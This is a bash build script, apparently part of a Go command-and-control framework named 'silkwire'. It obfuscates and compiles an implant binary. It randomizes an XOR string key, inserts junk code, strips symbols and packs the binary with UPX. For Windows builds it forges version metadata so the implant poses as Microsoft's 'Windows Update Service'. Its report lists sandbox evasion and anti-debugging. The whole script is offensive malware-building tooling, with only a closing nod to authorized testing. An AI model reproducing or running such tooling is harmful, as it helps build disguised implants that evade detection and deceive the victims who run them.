#!/bin/bash

# Comprehensive obfuscation build script for the implant
# This script applies all implemented obfuscation techniques

set -e

# Configuration
OBFUSCATION_LEVEL=${1:-3}  # Default to heavy obfuscation
OUTPUT_DIR="obfuscated_builds"
TEMP_DIR="temp_obfuscation"

# Detect source directory - check if we're in a directory with source files or need to use implant/
if [ -f "main.go" ] && [ -f "implant.go" ]; then
    SOURCE_DIR="."  # We're already in the source directory
else
    SOURCE_DIR="implant"  # We're in project root, use implant subdirectory
fi

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}[*] Starting comprehensive implant obfuscation${NC}"
echo -e "${BLUE}[*] Obfuscation level: ${OBFUSCATION_LEVEL}${NC}"

# Clean previous builds
rm -rf "${OUTPUT_DIR}" "${TEMP_DIR}"
mkdir -p "${OUTPUT_DIR}" "${TEMP_DIR}"

# Step 1: String Obfuscation
echo -e "${YELLOW}[1/8] Applying string obfuscation...${NC}"

# Copy source files to temp directory
if [ "${SOURCE_DIR}" = "." ]; then
    # We're in the source directory, copy .go files and related files
    cp *.go "${TEMP_DIR}/" 2>/dev/null || true
    cp go.mod "${TEMP_DIR}/" 2>/dev/null || true
    cp go.sum "${TEMP_DIR}/" 2>/dev/null || true
    
    # Copy proto and shared directories if they exist in current directory
    if [ -d "proto" ]; then
        echo "Found proto directory, copying..."
        cp -r proto "${TEMP_DIR}/" 2>/dev/null || true
    else
        echo "Proto directory not found in current directory, checking parent directories..."
        # Try to find proto directory in parent directories
        if [ -d "../proto" ]; then
            echo "Found proto in parent directory"
            cp -r ../proto "${TEMP_DIR}/" 2>/dev/null || true
        elif [ -d "../../proto" ]; then
            echo "Found proto in grandparent directory"
            cp -r ../../proto "${TEMP_DIR}/" 2>/dev/null || true
        else
            echo "Warning: proto directory not found, build may fail"
        fi
    fi
    
    if [ -d "shared" ]; then
        echo "Found shared directory, copying..."
        cp -r shared "${TEMP_DIR}/" 2>/dev/null || true
    else
        echo "Shared directory not found in current directory, checking parent directories..."
        # Try to find shared directory in parent directories
        if [ -d "../shared" ]; then
            echo "Found shared in parent directory"
            cp -r ../shared "${TEMP_DIR}/" 2>/dev/null || true
        elif [ -d "../../shared" ]; then
            echo "Found shared in grandparent directory"
            cp -r ../../shared "${TEMP_DIR}/" 2>/dev/null || true
        else
            echo "Warning: shared directory not found, build may fail"
        fi
    fi
else
    # We're in project root, copy from implant directory
    cp -r "${SOURCE_DIR}"/* "${TEMP_DIR}/"
fi



# Generate new obfuscation key
python3 -c "
import os
import hashlib
import base64

# Generate random key
key = os.urandom(16)
key_hex = key.hex()

# Update obfuscation.go with new key if it exists
obf_file = '${TEMP_DIR}/obfuscation.go'
if os.path.exists(obf_file):
    with open(obf_file, 'r') as f:
        content = f.read()

    # Replace the key
    old_key = 'var obfKey = []byte{0x4a, 0x72, 0x8e, 0x91, 0x3c, 0x55, 0x7f, 0x29, 0x82, 0x6d, 0x4b, 0xe1, 0x93, 0x5a, 0x8c, 0x67}'
    new_key = 'var obfKey = []byte{' + ', '.join([f'0x{b:02x}' for b in key]) + '}'
    content = content.replace(old_key, new_key)

    with open(obf_file, 'w') as f:
        f.write(content)

    print(f'Generated new obfuscation key: {key_hex}')
else:
    print('obfuscation.go not found, skipping key generation')
"

# Step 2: Function Name Obfuscation (disabled for now due to conflicts)
echo -e "${YELLOW}[2/8] Skipping function name obfuscation (causes conflicts)...${NC}"
echo "Function name obfuscation disabled to prevent conflicts"

# Step 3: Control Flow Obfuscation
echo -e "${YELLOW}[3/8] Applying control flow obfuscation...${NC}"
# Insert junk code and dead branches using Python for better control
python3 -c "
import os
import re

temp_dir = '${TEMP_DIR}'
for filename in os.listdir(temp_dir):
    if filename.endswith('.go'):
        filepath = os.path.join(temp_dir, filename)
        try:
            with open(filepath, 'r') as f:
                content = f.read()
            
            # Add junk code only after function declarations (not struct/array literals)
            # Look for 'func (...) {' pattern at the beginning of lines
            pattern = r'^(func\s+(?:\([^)]*\)\s*)?[\w]+\s*\([^)]*\)\s*(?:\([^)]*\))?\s*{)\s*$'
            
            def add_junk_code(match):
                func_line = match.group(1)
                junk_code = '''
	// Junk code for obfuscation
	if false {
		_ = make([]byte, 1024)
	}'''
                return func_line + junk_code
            
            # Apply the replacement
            modified_content = re.sub(pattern, add_junk_code, content, flags=re.MULTILINE)
            
            with open(filepath, 'w') as f:
                f.write(modified_content)
                
        except Exception as e:
            print(f'Error processing {filename}: {e}')
            continue

print('Applied control flow obfuscation')
"

# Step 4: Import Obfuscation (disabled for now due to conflicts)
echo -e "${YELLOW}[4/8] Skipping import obfuscation (causes conflicts)...${NC}"
echo "Import obfuscation disabled to prevent undefined imports"

# Step 5: Prepare for building and build with obfuscation flags
echo -e "${YELLOW}[5/8] Preparing for build...${NC}"

# First, download dependencies in the temp directory
echo "Downloading Go module dependencies..."
cd "${TEMP_DIR}"

# Set environment for module operations
export GOFLAGS=""
export GO111MODULE=on

# Verify required directories exist
echo "Verifying directory structure..."
echo "Current temp directory contents:"
ls -la

if [ ! -d "proto" ]; then
    echo "Warning: proto directory not found in temp directory"
    echo "Creating minimal proto structure..."
    mkdir -p proto
    
    # Try to copy protobuf files from parent directories
    if [ -f "../proto/c2.pb.go" ]; then
        echo "Copying protobuf files from parent directory..."
        cp ../proto/*.pb.go proto/ 2>/dev/null || true
    elif [ -f "../../proto/c2.pb.go" ]; then
        echo "Copying protobuf files from grandparent directory..."
        cp ../../proto/*.pb.go proto/ 2>/dev/null || true
    else
        echo "Warning: Could not find protobuf files, creating stubs..."
        # Create minimal stub files to prevent import errors
        echo "package c2" > proto/c2.pb.go
        echo "" >> proto/c2.pb.go
        echo "// Stub protobuf file" >> proto/c2.pb.go
        echo "type CommandMessage_CommandType int32" >> proto/c2.pb.go
        echo "const (" >> proto/c2.pb.go
        echo "    CommandMessage_HASHDUMP CommandMessage_CommandType = 21" >> proto/c2.pb.go
        echo ")" >> proto/c2.pb.go
    fi
    
    # Create a minimal go.mod for proto if it doesn't exist
    if [ ! -f "proto/go.mod" ]; then
        echo "module silkwire/proto" > proto/go.mod
        echo "" >> proto/go.mod
        echo "go 1.24.4" >> proto/go.mod
    fi
fi

if [ ! -d "shared" ]; then
    echo "Warning: shared directory not found in temp directory"
    echo "Creating minimal shared structure..."
    mkdir -p shared
    
    # Try to copy shared files from parent directories
    if [ -d "../shared" ] && [ -f "../shared/shared.go" ]; then
        echo "Copying shared files from parent directory..."
        cp ../shared/*.go shared/ 2>/dev/null || true
    elif [ -d "../../shared" ] && [ -f "../../shared/shared.go" ]; then
        echo "Copying shared files from grandparent directory..."
        cp ../../shared/*.go shared/ 2>/dev/null || true
    else
        echo "Warning: Could not find shared files, creating stubs..."
        # Create a minimal shared file to avoid import errors
        echo "package shared" > shared/shared.go
        echo "" >> shared/shared.go
        echo "// Generated stub file" >> shared/shared.go
        echo "func GenerateImplantID() string { return \"stub_id\" }" >> shared/shared.go
        echo "func GenerateCodename() string { return \"stub_codename\" }" >> shared/shared.go
    fi
    
    # Create a minimal go.mod for shared if it doesn't exist
    if [ ! -f "shared/go.mod" ]; then
        echo "module silkwire/shared" > shared/go.mod
        echo "" >> shared/go.mod
        echo "go 1.24.4" >> shared/go.mod
    fi
fi

# Create or fix go.mod
echo "Setting up Go module..."
if [ ! -f "go.mod" ]; then
    echo "Creating go.mod file..."
    cat > go.mod << 'EOF'
module silkwire/implant

go 1.24.4

require (
	github.com/aymanbagabas/go-pty v0.2.2
	google.golang.org/grpc v1.74.2
	silkwire/proto v0.0.0-00010101000000-000000000000
	silkwire/shared v0.0.0-00010101000000-000000000000
)

require (
	github.com/creack/pty v1.1.21 // indirect
	github.com/u-root/u-root v0.11.0 // indirect
	golang.org/x/crypto v0.38.0 // indirect
	golang.org/x/net v0.40.0 // indirect
	golang.org/x/sys v0.33.0 // indirect
	golang.org/x/text v0.25.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20250528174236-200df99c418a // indirect
	google.golang.org/protobuf v1.36.6 // indirect
)

replace silkwire/proto => ./proto

replace silkwire/shared => ./shared
EOF
else
    # Fix module replacements for local development
    echo "Fixing module replacements..."
    # Update the replace directives to point to the copied directories
    sed -i 's|replace silkwire/proto => ../proto|replace silkwire/proto => ./proto|g' go.mod
    sed -i 's|replace silkwire/shared => ../shared|replace silkwire/shared => ./shared|g' go.mod
    echo "Updated go.mod replacements:"
    grep "replace" go.mod || echo "No replace directives found"
fi

# Update module dependencies
echo "Running go mod tidy to update dependencies..."
go mod tidy

# Download dependencies
echo "Running go mod download..."
go mod download all
if [ $? -ne 0 ]; then
    echo "Error: go mod download failed"
    exit 1
fi

cd ..

# Remove problematic files that cause build conflicts
echo "Removing problematic obfuscation files that cause build errors..."
rm -f "${TEMP_DIR}/build_obfuscation.go"
rm -f "${TEMP_DIR}/name_obfuscation.go" 
rm -f "${TEMP_DIR}/api_obfuscation.go"
rm -f "${TEMP_DIR}/runtime_packing.go"
rm -f "${TEMP_DIR}/control_flow_obfuscation.go"
rm -f "${TEMP_DIR}/network_obfuscation.go"
rm -f "${TEMP_DIR}/advanced_evasion.go"  # Has Windows-specific syscalls
rm -f "${TEMP_DIR}/evasion_unix.go"      # Has Unix-specific syscalls
rm -f "${TEMP_DIR}/evasion.go"           # Has undefined symbol references
rm -f "${TEMP_DIR}/evasion_windows.go"   # Platform-specific code

echo "Problematic obfuscation files removed to ensure clean build"

# Create stub evasion functions to replace removed functionality
echo "Creating stub evasion functions..."
cat > "${TEMP_DIR}/evasion_stubs.go" << 'EOF'
package main

import "time"

// Stub implementations for removed evasion functions

// PerformEvasionChecks performs basic evasion checks (stub implementation)
func (i *Implant) PerformEvasionChecks() bool {
	// Simplified evasion check
	return true
}

// ApplySleepMask applies sleep masking (stub implementation)
func ApplySleepMask(duration time.Duration) {
	// Stub implementation - just sleep normally
	time.Sleep(duration)
}
EOF

echo "Created evasion stubs"

echo -e "${YELLOW}[5/8] Building with obfuscation flags...${NC}"

# Set build flags based on obfuscation level
# Note: CGO_ENABLED=0 is set by the caller (implant generator) which produces
# fully static binaries without glibc/libc dependencies. This ensures compatibility
# with older Linux kernels and prevents segmentation faults from glibc mismatches.
# Do NOT use -extldflags=-static (that's for external C linker when CGO is enabled).
# Do NOT use -buildmode=pie (incompatible with CGO_ENABLED=0 on many platforms).
BUILD_ID="obf$(date +%s)"
case $OBFUSCATION_LEVEL in
    0)
        LDFLAGS="-s -w"
        EXTRA_FLAGS=""
        ;;
    1)
        LDFLAGS="-s -w -X main.buildID=$BUILD_ID"
        EXTRA_FLAGS="-trimpath"
        ;;
    2) 
        LDFLAGS="-s -w -X main.buildID=$BUILD_ID"
        EXTRA_FLAGS="-trimpath"
        ;;
    3)
        LDFLAGS="-s -w -X main.buildID=$BUILD_ID"
        EXTRA_FLAGS="-trimpath"
        GCFLAGS='-gcflags="-N -l"'
        ;;
    4)
        LDFLAGS="-s -w -X main.buildID=$BUILD_ID"
        EXTRA_FLAGS="-trimpath"
        GCFLAGS='-gcflags="-N -l -m"'
        ASMFLAGS="-asmflags=-trimpath"
        ;;
esac

# Use the target platform from environment variables (set by implant generator)
# If not set, default to the current system
TARGET_GOOS=${GOOS:-$(go env GOOS)}
TARGET_GOARCH=${GOARCH:-$(go env GOARCH)}

echo -e "${GREEN}[*] Building for ${TARGET_GOOS}/${TARGET_GOARCH}...${NC}"

GOOS=$TARGET_GOOS
GOARCH=$TARGET_GOARCH

if [ "$GOOS" = "windows" ]; then
    OUTPUT_NAME="${OUTPUT_DIR}/implant_${GOOS}_${GOARCH}.exe"
else
    OUTPUT_NAME="${OUTPUT_DIR}/implant_${GOOS}_${GOARCH}"
fi

cd "${TEMP_DIR}"

# Build the command based on obfuscation level
echo "Building with LDFLAGS: $LDFLAGS"
echo "Extra flags: $EXTRA_FLAGS"

# Construct build command step by step
BUILD_CMD="go build -ldflags=\"$LDFLAGS\""

# Add extra flags if they exist
if [ -n "$EXTRA_FLAGS" ]; then
    BUILD_CMD="$BUILD_CMD $EXTRA_FLAGS"
fi

# Add gcflags for levels 3+
if [ $OBFUSCATION_LEVEL -ge 3 ] && [ -n "$GCFLAGS" ]; then
    BUILD_CMD="$BUILD_CMD $GCFLAGS"
fi

# Add asmflags for level 4
if [ $OBFUSCATION_LEVEL -eq 4 ] && [ -n "$ASMFLAGS" ]; then
    BUILD_CMD="$BUILD_CMD $ASMFLAGS"
fi

# Add output and source
BUILD_CMD="$BUILD_CMD -o \"../$OUTPUT_NAME\" ."

# CGO_ENABLED=0 ensures fully static binary without glibc dependencies
# This is critical for compatibility with older Linux kernels
echo "Executing: CGO_ENABLED=0 GOOS=$GOOS GOARCH=$GOARCH $BUILD_CMD"
eval "CGO_ENABLED=0 GOOS=$GOOS GOARCH=$GOARCH $BUILD_CMD"

cd ..

echo -e "${GREEN}[✓] Built: $OUTPUT_NAME${NC}"

# Step 6: Apply binary obfuscation
echo -e "${YELLOW}[6/8] Applying binary obfuscation...${NC}"

if [ -f "$OUTPUT_NAME" ]; then
    echo -e "${GREEN}[*] Processing: $(basename $OUTPUT_NAME)${NC}"
    
    # Strip additional symbols
    if command -v strip >/dev/null 2>&1; then
        strip "$OUTPUT_NAME" 2>/dev/null || true
    fi
    
    # Apply UPX packing if available and level >= 2
    if command -v upx >/dev/null 2>&1 && [ $OBFUSCATION_LEVEL -ge 2 ]; then
        echo -e "${GREEN}[*] Applying UPX compression...${NC}"
        
        case $OBFUSCATION_LEVEL in
            2)
                upx --compress-exports=0 --compress-icons=0 -3 "$OUTPUT_NAME" 2>/dev/null || true
                ;;
            3)
                upx --compress-exports=0 --compress-icons=0 -8 "$OUTPUT_NAME" 2>/dev/null || true
                ;;
            4)
                upx --compress-exports=0 --compress-icons=0 --ultra-brute "$OUTPUT_NAME" 2>/dev/null || true
                ;;
        esac
    fi
fi

# Step 7: Add fake resources (Windows only)
echo -e "${YELLOW}[7/8] Adding fake resources...${NC}"

if command -v rcedit >/dev/null 2>&1 && [ "$GOOS" = "windows" ]; then
    if [ -f "$OUTPUT_NAME" ]; then
        echo -e "${GREEN}[*] Adding resources to: $(basename $OUTPUT_NAME)${NC}"
        
        # Add fake version info
        rcedit "$OUTPUT_NAME" --set-version-string "CompanyName" "Microsoft Corporation" 2>/dev/null || true
        rcedit "$OUTPUT_NAME" --set-version-string "FileDescription" "Windows Update Service" 2>/dev/null || true
        rcedit "$OUTPUT_NAME" --set-version-string "LegalCopyright" "© Microsoft Corporation. All rights reserved." 2>/dev/null || true
        rcedit "$OUTPUT_NAME" --set-version-string "ProductName" "Microsoft Windows" 2>/dev/null || true
        rcedit "$OUTPUT_NAME" --set-file-version "10.0.19041.1234" 2>/dev/null || true
        rcedit "$OUTPUT_NAME" --set-product-version "10.0.19041.1234" 2>/dev/null || true
    fi
elif [ "$GOOS" = "windows" ]; then
    echo "rcedit not found, skipping resource modification"
else
    echo "Skipping resource modification (not building for Windows)"
fi

# Step 8: Generate build report
echo -e "${YELLOW}[8/8] Generating build report...${NC}"

cat > "${OUTPUT_DIR}/build_report.txt" << EOF
Obfuscated Implant Build Report
===============================

Build Date: $(date)
Obfuscation Level: $OBFUSCATION_LEVEL
Build Flags: $BUILD_FLAGS

Obfuscation Techniques Applied:
- String obfuscation with XOR encryption
- Function and variable name obfuscation
- Control flow obfuscation with junk code
- Import path obfuscation
- API call obfuscation
- Enhanced anti-debugging techniques
- Advanced sandbox evasion
- Network traffic obfuscation
- Runtime code packing
- Symbol stripping
- Build path trimming

Files Generated:
EOF

if [ -f "$OUTPUT_NAME" ]; then
    size=$(stat -f%z "$OUTPUT_NAME" 2>/dev/null || stat -c%s "$OUTPUT_NAME" 2>/dev/null || echo "unknown")
    hash=$(sha256sum "$OUTPUT_NAME" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "$OUTPUT_NAME" 2>/dev/null | cut -d' ' -f1 || echo "unknown")
    echo "- $(basename $OUTPUT_NAME): ${size} bytes, SHA256: ${hash}" >> "${OUTPUT_DIR}/build_report.txt"
fi

# Clean up temporary files
rm -rf "${TEMP_DIR}"

echo -e "${GREEN}[✓] Obfuscation complete!${NC}"
echo -e "${GREEN}[✓] Output directory: ${OUTPUT_DIR}${NC}"
echo -e "${GREEN}[✓] Build report: ${OUTPUT_DIR}/build_report.txt${NC}"

# Display final statistics
echo ""
echo -e "${BLUE}=== Build Statistics ===${NC}"
echo -e "${BLUE}Target Platform: ${GOOS}/${GOARCH}${NC}"
echo -e "${BLUE}Obfuscation Level: ${OBFUSCATION_LEVEL}/4${NC}"
if [ -f "$OUTPUT_NAME" ]; then
    file_size=$(stat -f%z "$OUTPUT_NAME" 2>/dev/null || stat -c%s "$OUTPUT_NAME" 2>/dev/null || echo "unknown")
    echo -e "${BLUE}Binary Size: ${file_size} bytes${NC}"
    echo -e "${BLUE}Output File: $(basename $OUTPUT_NAME)${NC}"
else
    echo -e "${BLUE}No output file generated${NC}"
fi
echo ""
echo -e "${GREEN}[!] Remember to test the obfuscated binaries thoroughly!${NC}"
echo -e "${GREEN}[!] Higher obfuscation levels may impact performance${NC}"
echo -e "${YELLOW}[!] Use responsibly and only for authorized testing${NC}"
